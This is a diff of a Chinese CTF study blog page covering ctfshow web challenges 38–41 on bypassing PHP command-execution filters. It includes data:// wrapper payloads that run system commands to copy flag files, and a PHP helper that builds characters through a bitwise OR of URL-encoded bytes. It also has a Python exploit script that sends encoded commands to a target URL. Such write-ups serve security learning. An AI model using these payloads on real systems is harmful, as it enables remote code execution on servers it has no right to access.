@@ -469,14 +469,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
+                    3.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    13 分
                 </div>
                 
 
@@ -507,6 +507,7 @@
 <li>过滤了分号，最后一条语句可以不带分号，结束的标志为’?&gt;’,则我们可以将两条语句中间需要分号的位置替换为’?&gt;’,那么就可以使用两条语句</li>
 <li>过滤了分号和括号，则必须使用语言结构，echo print isset unset include require，使用include加上php过滤器实现</li>
 <li>文件包含题目：使用伪协议：data伪协议可以执行后面的php代码</li>
+<li>过滤掉了字符和数字：使用url编码去代替字符，如果可以使用或运算，即可通过或运算去取字符，web41</li>
 </ol>
 <h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><h3 id="cookie的概念"><a href="#cookie的概念" class="headerlink" title="cookie的概念"></a>cookie的概念</h3><ol>
 <li>cookie用于识别用户，cookie是服务器留在用户计算机中的小文件，每当相同的计算机通过浏览器请求页面时，它同时会发送cookie<h3 id="isset"><a href="#isset" class="headerlink" title="isset()"></a>isset()</h3></li>
@@ -619,6 +620,173 @@ abc.php中源码为
 <li>对于要包含php执行代码的文件包含题目，使用data://text/plain,伪协议可以绕过过滤了eval等执行函数的情况<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li>执行上面的函数发现可以执行，满足fopen和include都开启的条件，则后面的php执行代码可以操作<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(&quot;mv fla?.php 1.txt&quot;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
 <li>和过滤后缀的题目一样，重命名后再在路径后面直接添加1.txt即可访问到</li>
+</ol>
+<h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><ol>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721141702.png"></li>
+<li>发现还是一个文件包含题目，考虑使用php伪协议</li>
+<li>使用伪协议发现可以执行<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721141821.png"></li>
+<li>继续执行将flag.php文件换名的操作，最后直接在URL后面加上新换名的文件即可查看到flag<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D; system(&quot;cp fla?.??? 1.txt&quot;);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><ol>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721142504.png"></li>
+<li>发现只是过滤了参数c中的”flag“字段，还是一个文件包含题目，考虑是使用伪协议</li>
+<li>按照上面的方式即可得到flag</li>
+</ol>
+<h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><h3 id="array-pop"><a href="#array-pop" class="headerlink" title="array_pop()"></a>array_pop()</h3><ol>
+<li>删除数组中的最后一个元素<pre class="line-numbers language-none"><code class="language-none">array_pop(array)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>其中array参数是必须的</li>
+<li>返回值：返回数组中的最后一个值，如果数组是空的，或者不是一个数组，将返回NULL</li>
+</ol>
+<h3 id="print-r"><a href="#print-r" class="headerlink" title="print_r()"></a>print_r()</h3><ol>
+<li>print_r()函数用于打印变量，以更容易理解的方式展示<pre class="line-numbers language-none"><code class="language-none">bool print_r(mixed $expression [,bool $return]);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>$expression为要打印的变量，如果是string,integer,float则会打印变量值本身，如果是array类型，将会按照一定的格式显示键和元素</li>
+<li>$return:可选，如果为true，则不会输出结果，而是将返回值的结果赋值给一个变量，false则直接输出结果，默认为false<pre class="line-numbers language-none"><code class="language-none">
+&lt;?php
+$a &#x3D; array (&#39;a&#39; &#x3D;&gt; &#39;apple&#39;, &#39;b&#39; &#x3D;&gt; &#39;banana&#39;, &#39;c&#39; &#x3D;&gt; array (&#39;x&#39;,&#39;y&#39;,&#39;z&#39;));
+print_r ($a);
+?&gt;
+
+返回结果为
+Array
+(
+    [a] &#x3D;&gt; apple
+    [b] &#x3D;&gt; banana
+    [c] &#x3D;&gt; Array
+        (
+            [0] &#x3D;&gt; x
+            [1] &#x3D;&gt; y
+            [2] &#x3D;&gt; z
+        )
+
+)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">
+&lt;?php
+$b &#x3D; array (&#39;m&#39; &#x3D;&gt; &#39;monkey&#39;, &#39;foo&#39; &#x3D;&gt; &#39;bar&#39;, &#39;x&#39; &#x3D;&gt; array (&#39;x&#39;, &#39;y&#39;, &#39;z&#39;));
+$results &#x3D; print_r ($b, true); &#x2F;&#x2F; $results 包含了 print_r 的输出结果
+?&gt;
+这个则没有返回值，因为输出结果赋值给了results变量，$return的参数值设置为了true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h3><ol>
+<li>next()函数将内部指针指向数组中的下一个元素，并输出</li>
+<li>返回值为内部指针指向的下一个元素的值</li>
+<li>next(array)内部参数为array，是一个数组</li>
+</ol>
+<h3 id="current"><a href="#current" class="headerlink" title="current()"></a>current()</h3><ol>
+<li>输出数组中当前内部指针指向的元素的值</li>
+<li>每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</li>
+<li>该函数不会移动内部指针</li>
+</ol>
+<h3 id="end"><a href="#end" class="headerlink" title="end()"></a>end()</h3><h3 id="prev"><a href="#prev" class="headerlink" title="prev()"></a>prev()</h3><h3 id="reset"><a href="#reset" class="headerlink" title="reset()"></a>reset()</h3><h3 id="each"><a href="#each" class="headerlink" title="each()"></a>each()</h3><ol>
+<li>each()返回的不只是值，是键值对，并且将内部指针向前移动<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721145855.png"></li>
+</ol>
+<h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><ol>
+<li>get_defined_vars()函数返回由所有已经定义的变量所组成的数组<pre class="line-numbers language-none"><code class="language-none">array get_defined_vars(void);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>返回值：返回一个包含所有已经定义变量列表的多维数组，这些变量包括环境变量，服务器变量，和用户定义的变量</li>
+</ol>
+<h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><ol>
+<li>因为不能用$,所以不能使用之前的逃逸字符来绕过</li>
+<li>考虑是否能通过打印变量，从变量中获取到信息<pre class="line-numbers language-none"><code class="language-none">?c&#x3D;print_r(get_defined_vars());<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721150824.png">发现是通过post给这个数组传参，尝试加一个post值</li>
+<li>post传参后回显<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721150904.png"></li>
+<li>为了拿到array中的那个phpinfo()的字符串，rce一下，使用next函数将指针后移,并且形成了一个新的数组，这个数组的值为phpinfo(),键为它的键</li>
+<li>为了拿到指针指向的那个值，弹出array_pop()，将会返回数组中的最后一个值</li>
+</ol>
+<h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><h3 id="或运算取字符"><a href="#或运算取字符" class="headerlink" title="或运算取字符"></a>或运算取字符</h3><ol>
+<li>%40 | %01 可以取到A，或运算是两个都为0才为0，一个为1则为1</li>
+<li>计算机中保存URL编码是通过十六进制保存的<pre class="line-numbers language-none"><code class="language-none">%40的二进制为0100 0000
+%01的二进制为0000 0001
+取或得到     0100 0001
+结果从二进制转为十六进制，得到结果为65，转ascii码为A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="生成可用字符的脚本"><a href="#生成可用字符的脚本" class="headerlink" title="生成可用字符的脚本"></a>生成可用字符的脚本</h3><ol>
+<li>原理：从进行异或的字符中排除掉被过滤的，然后判断异或得到的字符是否为可见字符<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$myfile &#x3D; fopen(&quot;rce_or.txt&quot;, &quot;w&quot;);
+$contents&#x3D;&quot;&quot;;
+for ($i&#x3D;0; $i &lt; 256; $i++) &#123; 
+	for ($j&#x3D;0; $j &lt;256 ; $j++) &#123; 
+
+		if($i&lt;16)&#123;
+			$hex_i&#x3D;&#39;0&#39;.dechex($i);
+		&#125;
+		else&#123;
+			$hex_i&#x3D;dechex($i);
+		&#125;
+		if($j&lt;16)&#123;
+			$hex_j&#x3D;&#39;0&#39;.dechex($j);
+		&#125;
+		else&#123;
+			$hex_j&#x3D;dechex($j);
+		&#125;
+		$preg &#x3D; &#39;&#x2F;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x2F;i&#39;;
+		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;
+					echo &quot;&quot;;
+    &#125;
+  
+		else&#123;
+		$a&#x3D;&#39;%&#39;.$hex_i;
+		$b&#x3D;&#39;%&#39;.$hex_j;
+		$c&#x3D;(urldecode($a)|urldecode($b));
+		if (ord($c)&gt;&#x3D;32&amp;ord($c)&lt;&#x3D;126) &#123;
+			$contents&#x3D;$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\n&quot;;
+		&#125;
+	&#125;
+
+&#125;
+&#125;
+fwrite($myfile,$contents);
+fclose($myfile);
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="python脚本跑"><a href="#python脚本跑" class="headerlink" title="python脚本跑"></a>python脚本跑</h3><ol>
+<li>用法：python exp.py <url></li>
+<li>传递参数getflag<pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-
+import requests
+import urllib
+from sys import *
+import os
+os.system(&quot;php rce_or.php&quot;)  #没有将php写入环境变量需手动运行
+if(len(argv)!&#x3D;2):
+   print(&quot;&#x3D;&quot;*50)
+   print(&#39;USER：python exp.py &lt;url&gt;&#39;)
+   print(&quot;eg：  python exp.py http:&#x2F;&#x2F;ctf.show&#x2F;&quot;)
+   print(&quot;&#x3D;&quot;*50)
+   exit(0)
+url&#x3D;argv[1]
+def action(arg):
+   s1&#x3D;&quot;&quot;
+   s2&#x3D;&quot;&quot;
+   for i in arg:
+       f&#x3D;open(&quot;rce_or.txt&quot;,&quot;r&quot;)
+       while True:
+           t&#x3D;f.readline()
+           if t&#x3D;&#x3D;&quot;&quot;:
+               break
+           if t[0]&#x3D;&#x3D;i:
+               #print(i)
+               s1+&#x3D;t[2:5]
+               s2+&#x3D;t[6:9]
+               break
+       f.close()
+   output&#x3D;&quot;(\&quot;&quot;+s1+&quot;\&quot;|\&quot;&quot;+s2+&quot;\&quot;)&quot;
+   return(output)
+   
+while True:
+   param&#x3D;action(input(&quot;\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))
+   data&#x3D;&#123;
+       &#39;c&#39;:urllib.parse.unquote(param)
+       &#125;
+   r&#x3D;requests.post(url,data&#x3D;data)
+   print(&quot;\n[*] result:\n&quot;+r.text)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><ol>
+<li>过滤了$,+,-,^,~,使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字，但是特意留了个字符|，最重要的是没有过滤掉%,所以可以使用URL编码去解决问题<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220721153703.png"></li>
+<li>可以从ASCII为0-255的字符中找到或运算能得到的可用的字符</li>
+<li>跑脚本吧，虽然最后我也没解出来，但是思路是对的</li>
+</ol>
+<h2 id="web41-1"><a href="#web41-1" class="headerlink" title="web41"></a>web41</h2><h3 id="黑洞"><a href="#黑洞" class="headerlink" title="黑洞"></a>黑洞</h3><ol>
+<li>‘&gt;/dev/null’命令</li>
+<li>目的是抑制各种命令输出的空设备<a target="_blank" rel="noopener" href="https://linuxhint.com/two-dev-null-command-purpose/">https://linuxhint.com/two-dev-null-command-purpose/</a></li>
 </ol>
 
                 
@@ -1146,7 +1314,7 @@ abc.php中源码为
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">68.7k</span>&nbsp;字
+                class="white-color">73.6k</span>&nbsp;字
             
             
             
